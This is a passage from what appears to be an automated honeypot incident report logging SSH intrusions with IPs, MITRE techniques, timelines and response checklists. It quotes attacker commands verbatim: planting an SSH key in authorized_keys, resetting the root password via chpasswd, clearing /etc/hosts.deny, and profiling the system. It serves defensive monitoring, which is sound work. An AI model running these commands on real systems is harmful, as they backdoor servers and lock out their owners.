| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:33:54` | `cowrie.session.connect` |
| `2026-03-09 10:33:54` | `cowrie.client.version` |
| `2026-03-09 10:33:54` | `cowrie.client.kex` |
| `2026-03-09 10:33:55` | `cowrie.login.success` |
| `2026-03-09 10:33:56` | `cowrie.session.params` |
| `2026-03-09 10:33:56` | `cowrie.command.input` |
| `2026-03-09 10:33:56` | `cowrie.command.failed` |
| `2026-03-09 10:33:56` | `cowrie.log.closed` |
| `2026-03-09 10:33:57` | `cowrie.session.params` |
| `2026-03-09 10:33:57` | `cowrie.command.input` |
| `2026-03-09 10:33:57` | `cowrie.session.file_download` |
| `2026-03-09 10:33:57` | `cowrie.log.closed` |
| `2026-03-09 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c492344f362

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.80` |
| **First Seen** | 2026-03-09 10:34 |
| **Last Seen** | 2026-03-09 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:34:01` | `cowrie.session.connect` |
| `2026-03-09 10:34:01` | `cowrie.client.version` |
| `2026-03-09 10:34:01` | `cowrie.client.kex` |
| `2026-03-09 10:34:02` | `cowrie.login.success` |
| `2026-03-09 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaea5e442afe

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122.186` |
| **First Seen** | 2026-03-09 13:24 |
| **Last Seen** | 2026-03-09 13:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:24:20` | `cowrie.session.connect` |
| `2026-03-09 13:24:20` | `cowrie.client.version` |
| `2026-03-09 13:24:20` | `cowrie.client.kex` |
| `2026-03-09 13:24:20` | `cowrie.login.success` |
| `2026-03-09 13:24:21` | `cowrie.session.params` |
| `2026-03-09 13:24:21` | `cowrie.command.input` |
| `2026-03-09 13:24:21` | `cowrie.command.failed` |
| `2026-03-09 13:24:21` | `cowrie.log.closed` |
| `2026-03-09 13:24:21` | `cowrie.session.params` |
| `2026-03-09 13:24:21` | `cowrie.command.input` |
| `2026-03-09 13:24:21` | `cowrie.session.file_download` |
| `2026-03-09 13:24:21` | `cowrie.log.closed` |
| `2026-03-09 13:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122.186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122.186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fdc93a086c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122.186` |
| **First Seen** | 2026-03-09 13:24 |
| **Last Seen** | 2026-03-09 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:24:23` | `cowrie.session.connect` |
| `2026-03-09 13:24:23` | `cowrie.client.version` |
| `2026-03-09 13:24:23` | `cowrie.client.kex` |
| `2026-03-09 13:24:23` | `cowrie.login.success` |
| `2026-03-09 13:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122.186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122.186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169259bb5cd0

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181.192` |
| **First Seen** | 2026-03-09 13:36 |
| **Last Seen** | 2026-03-09 13:37 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SOD7We6KASea"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'}, {'url': '', 'sha256': '01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:36:23` | `cowrie.session.connect` |
| `2026-03-09 13:36:23` | `cowrie.client.version` |
| `2026-03-09 13:36:23` | `cowrie.client.kex` |
| `2026-03-09 13:36:25` | `cowrie.login.success` |
| `2026-03-09 13:36:25` | `cowrie.session.params` |
| `2026-03-09 13:36:25` | `cowrie.command.input` |
| `2026-03-09 13:36:25` | `cowrie.command.failed` |
| `2026-03-09 13:36:25` | `cowrie.log.closed` |
| `2026-03-09 13:36:26` | `cowrie.session.params` |
| `2026-03-09 13:36:26` | `cowrie.command.input` |
| `2026-03-09 13:36:26` | `cowrie.session.file_download` |
| `2026-03-09 13:36:26` | `cowrie.log.closed` |
| `2026-03-09 13:36:39` | `cowrie.session.params` |
| `2026-03-09 13:36:39` | `cowrie.command.input` |
| `2026-03-09 13:36:39` | `cowrie.log.closed` |
| `2026-03-09 13:36:40` | `cowrie.session.params` |
| `2026-03-09 13:36:40` | `cowrie.command.input` |
| `2026-03-09 13:36:40` | `cowrie.log.closed` |
| `2026-03-09 13:36:40` | `cowrie.session.params` |
| `2026-03-09 13:36:40` | `cowrie.command.input` |
| `2026-03-09 13:36:41` | `cowrie.session.file_download` |
| `2026-03-09 13:36:41` | `cowrie.log.closed` |
| `2026-03-09 13:36:43` | `cowrie.session.params` |
| `2026-03-09 13:36:43` | `cowrie.command.input` |
| `2026-03-09 13:36:43` | `cowrie.log.closed` |
| `2026-03-09 13:36:44` | `cowrie.session.params` |
| `2026-03-09 13:36:44` | `cowrie.command.input` |
| `2026-03-09 13:36:44` | `cowrie.log.closed` |
| `2026-03-09 13:36:46` | `cowrie.session.params` |
| `2026-03-09 13:36:46` | `cowrie.command.input` |
| `2026-03-09 13:36:46` | `cowrie.command.input` |
| `2026-03-09 13:36:46` | `cowrie.log.closed` |
| `2026-03-09 13:36:46` | `cowrie.session.params` |
| `2026-03-09 13:36:46` | `cowrie.command.input` |
| `2026-03-09 13:36:48` | `cowrie.log.closed` |
| `2026-03-09 13:36:48` | `cowrie.session.params` |
| `2026-03-09 13:36:48` | `cowrie.command.input` |
| `2026-03-09 13:36:49` | `cowrie.log.closed` |
| `2026-03-09 13:36:50` | `cowrie.session.params` |
| `2026-03-09 13:36:50` | `cowrie.command.input` |
| `2026-03-09 13:36:50` | `cowrie.log.closed` |
| `2026-03-09 13:36:51` | `cowrie.session.params` |
| `2026-03-09 13:36:51` | `cowrie.command.input` |
| `2026-03-09 13:36:51` | `cowrie.log.closed` |
| `2026-03-09 13:36:52` | `cowrie.session.params` |
| `2026-03-09 13:36:52` | `cowrie.command.input` |
| `2026-03-09 13:36:53` | `cowrie.log.closed` |
| `2026-03-09 13:36:55` | `cowrie.session.params` |
| `2026-03-09 13:36:55` | `cowrie.command.input` |
| `2026-03-09 13:36:55` | `cowrie.log.closed` |
| `2026-03-09 13:36:57` | `cowrie.session.params` |
| `2026-03-09 13:36:57` | `cowrie.command.input` |
| `2026-03-09 13:36:57` | `cowrie.log.closed` |
| `2026-03-09 13:36:58` | `cowrie.session.params` |
| `2026-03-09 13:36:58` | `cowrie.command.input` |
| `2026-03-09 13:36:58` | `cowrie.log.closed` |
| `2026-03-09 13:36:59` | `cowrie.session.params` |
| `2026-03-09 13:36:59` | `cowrie.command.input` |
| `2026-03-09 13:37:00` | `cowrie.log.closed` |
| `2026-03-09 13:37:00` | `cowrie.session.params` |
| `2026-03-09 13:37:00` | `cowrie.command.input` |
| `2026-03-09 13:37:02` | `cowrie.log.closed` |
| `2026-03-09 13:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181.192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181.192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa3ba681170

| Field | Detail |
|---|---|
| **Source IP** | `159.223.43.225` |
| **First Seen** | 2026-03-09 13:47 |
| **Last Seen** | 2026-03-09 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:47:19` | `cowrie.session.connect` |
| `2026-03-09 13:47:19` | `cowrie.client.version` |
| `2026-03-09 13:47:19` | `cowrie.client.kex` |
| `2026-03-09 13:47:19` | `cowrie.login.success` |
| `2026-03-09 13:47:20` | `cowrie.session.params` |
| `2026-03-09 13:47:20` | `cowrie.command.input` |
| `2026-03-09 13:47:20` | `cowrie.command.input` |
| `2026-03-09 13:47:20` | `cowrie.command.input` |
| `2026-03-09 13:47:20` | `cowrie.command.input` |
| `2026-03-09 13:47:20` | `cowrie.log.closed` |
| `2026-03-09 13:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.43.225` to AbuseIPDB if not already reported
- [ ] Block `159.223.43.225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0229035f1869

| Field | Detail |
|---|---|
| **Source IP** | `159.223.43.225` |
| **First Seen** | 2026-03-09 13:48 |
| **Last Seen** | 2026-03-09 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:48:07` | `cowrie.session.connect` |
| `2026-03-09 13:48:07` | `cowrie.client.version` |
| `2026-03-09 13:48:07` | `cowrie.client.kex` |
| `2026-03-09 13:48:08` | `cowrie.login.success` |
| `2026-03-09 13:48:08` | `cowrie.session.params` |
| `2026-03-09 13:48:08` | `cowrie.command.input` |
| `2026-03-09 13:48:08` | `cowrie.command.input` |
| `2026-03-09 13:48:08` | `cowrie.command.input` |
| `2026-03-09 13:48:08` | `cowrie.command.input` |
| `2026-03-09 13:48:09` | `cowrie.log.closed` |
| `2026-03-09 13:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.43.225` to AbuseIPDB if not already reported
- [ ] Block `159.223.43.225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4e356b0e04

| Field | Detail |
|---|---|
| **Source IP** | `159.223.43.225` |
| **First Seen** | 2026-03-09 13:48 |
| **Last Seen** | 2026-03-09 13:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:48:55` | `cowrie.session.connect` |
| `2026-03-09 13:48:55` | `cowrie.client.version` |
| `2026-03-09 13:48:55` | `cowrie.client.kex` |
| `2026-03-09 13:48:56` | `cowrie.login.success` |
| `2026-03-09 13:48:56` | `cowrie.session.params` |
| `2026-03-09 13:48:56` | `cowrie.command.input` |
| `2026-03-09 13:48:56` | `cowrie.command.input` |
| `2026-03-09 13:48:56` | `cowrie.command.input` |
| `2026-03-09 13:48:56` | `cowrie.command.input` |
| `2026-03-09 13:48:56` | `cowrie.log.closed` |
| `2026-03-09 13:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.43.225` to AbuseIPDB if not already reported
- [ ] Block `159.223.43.225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ac56cfeca0

| Field | Detail |
|---|---|
| **Source IP** | `159.223.43.225` |
| **First Seen** | 2026-03-09 13:49 |
| **Last Seen** | 2026-03-09 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:49:42` | `cowrie.session.connect` |
| `2026-03-09 13:49:43` | `cowrie.client.version` |
| `2026-03-09 13:49:43` | `cowrie.client.kex` |
| `2026-03-09 13:49:43` | `cowrie.login.success` |
| `2026-03-09 13:49:44` | `cowrie.session.params` |
| `2026-03-09 13:49:44` | `cowrie.command.input` |
| `2026-03-09 13:49:44` | `cowrie.command.input` |
| `2026-03-09 13:49:44` | `cowrie.command.input` |
| `2026-03-09 13:49:44` | `cowrie.command.input` |
| `2026-03-09 13:49:44` | `cowrie.log.closed` |
| `2026-03-09 13:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.43.225` to AbuseIPDB if not already reported
- [ ] Block `159.223.43.225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ced83a8b87

| Field | Detail |
|---|---|
| **Source IP** | `159.223.43.225` |
| **First Seen** | 2026-03-09 13:50 |
| **Last Seen** | 2026-03-09 13:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:50:47` | `cowrie.session.connect` |
| `2026-03-09 13:50:47` | `cowrie.client.version` |
| `2026-03-09 13:50:47` | `cowrie.client.kex` |
| `2026-03-09 13:50:47` | `cowrie.login.success` |
| `2026-03-09 13:50:48` | `cowrie.session.params` |
| `2026-03-09 13:50:48` | `cowrie.command.input` |
| `2026-03-09 13:50:48` | `cowrie.command.input` |
| `2026-03-09 13:50:48` | `cowrie.command.input` |
| `2026-03-09 13:50:48` | `cowrie.command.input` |
| `2026-03-09 13:50:48` | `cowrie.log.closed` |
| `2026-03-09 13:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.43.225` to AbuseIPDB if not already reported
- [ ] Block `159.223.43.225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a13233d4b9f7

| Field | Detail |
|---|---|
| **Source IP** | `165.232.176.32` |
| **First Seen** | 2026-03-09 14:06 |
| **Last Seen** | 2026-03-09 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 14:06:40` | `cowrie.session.connect` |
| `2026-03-09 14:06:40` | `cowrie.client.version` |
| `2026-03-09 14:06:40` | `cowrie.client.kex` |
| `2026-03-09 14:06:40` | `cowrie.login.success` |
| `2026-03-09 14:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.176.32` to AbuseIPDB if not already reported
- [ ] Block `165.232.176.32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.41.71` | **20** | 2026-03-09 01:13 | 2026-03-09 01:17 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `59.5.190.226` | **18** | 2026-03-09 04:02 | 2026-03-09 04:07 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.181.192` | **11** | 2026-03-09 13:25 | 2026-03-09 13:43 | 18m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.185.165` | **11** | 2026-03-09 06:06 | 2026-03-09 06:24 | 18m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.109.176` | **10** | 2026-03-09 13:55 | 2026-03-09 14:15 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.123.173` | **10** | 2026-03-09 04:09 | 2026-03-09 04:31 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137.80` | **10** | 2026-03-09 10:28 | 2026-03-09 10:42 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.44.38.145` | **10** | 2026-03-09 01:48 | 2026-03-09 02:14 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `157.15.59.120` | **9** | 2026-03-09 06:26 | 2026-03-09 06:48 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220.121` | **6** | 2026-03-09 05:49 | 2026-03-09 05:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.129.179` | **2** | 2026-03-09 03:47 | 2026-03-09 03:51 | 4m | 0 | `T1592` | 🟢 LOW |
| `112.164.20.69` | **2** | 2026-03-09 04:56 | 2026-03-09 04:56 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `112.53.99.37` | **2** | 2026-03-09 01:43 | 2026-03-09 01:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.92.15.204` | **2** | 2026-03-09 08:18 | 2026-03-09 08:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `138.68.169.179` | **2** | 2026-03-09 04:04 | 2026-03-09 04:06 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `159.223.43.225` | **2** | 2026-03-09 13:45 | 2026-03-09 13:46 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `170.64.177.28` | **2** | 2026-03-09 07:34 | 2026-03-09 07:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.200.225` | **2** | 2026-03-09 02:13 | 2026-03-09 02:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105.169` | **2** | 2026-03-09 04:13 | 2026-03-09 04:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.189.106.227` | **2** | 2026-03-09 02:49 | 2026-03-09 02:50 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.140.186.44` | **2** | 2026-03-09 09:24 | 2026-03-09 09:24 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.143.61.140` | **2** | 2026-03-09 11:05 | 2026-03-09 11:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `40.124.173.16` | **2** | 2026-03-09 03:38 | 2026-03-09 03:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.178.49` | **2** | 2026-03-09 14:28 | 2026-03-09 14:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.13.82.58` | **2** | 2026-03-09 04:50 | 2026-03-09 04:50 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.213.214.233` | 1 | 2026-03-09 02:31 | 2026-03-09 02:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `1.225.62.211` | 1 | 2026-03-09 09:42 | 2026-03-09 09:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.200.236.207` | 1 | 2026-03-09 01:33 | 2026-03-09 01:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.36.122.186` | 1 | 2026-03-09 13:24 | 2026-03-09 13:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137.213` | 1 | 2026-03-09 08:06 | 2026-03-09 08:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.37.18.101` | 1 | 2026-03-09 04:14 | 2026-03-09 04:14 | 16s | 0 | `T1592` | 🟢 LOW |
| `110.38.211.186` | 1 | 2026-03-09 11:35 | 2026-03-09 11:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `113.108.79.152` | 1 | 2026-03-09 02:35 | 2026-03-09 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.219.209.170` | 1 | 2026-03-09 10:31 | 2026-03-09 10:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.249.103.89` | 1 | 2026-03-09 01:48 | 2026-03-09 01:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.42.71.140` | 1 | 2026-03-09 04:48 | 2026-03-09 04:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.1.61.81` | 1 | 2026-03-09 11:05 | 2026-03-09 11:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.175.69` | 1 | 2026-03-09 00:18 | 2026-03-09 00:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.80.70` | 1 | 2026-03-09 11:20 | 2026-03-09 11:21 | 39s | 0 | `T1592` | 🟢 LOW |
| `124.29.225.50` | 1 | 2026-03-09 01:01 | 2026-03-09 01:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `125.133.1.182` | 1 | 2026-03-09 05:36 | 2026-03-09 05:36 | 13s | 0 | `T1592` | 🟢 LOW |
